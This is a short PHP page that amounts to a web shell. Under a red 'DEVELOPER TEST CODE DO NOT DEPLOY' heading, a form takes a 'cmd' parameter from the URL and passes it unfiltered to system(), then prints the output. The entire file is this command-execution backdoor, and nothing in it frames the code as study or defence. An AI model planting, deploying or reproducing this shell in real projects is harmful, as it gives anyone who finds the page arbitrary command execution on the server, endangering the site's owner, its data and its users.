<html>
<body>
<h1 style= "color:red;">DEVELOPER TEST CODE DO NOT DEPLOY </h1>
<form method="GET" name='<?php echo basename($_SERVER['PHP_SELF']); ?>'>
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . " 2>&1");
    }
?>
</pre>
</body>
</html>
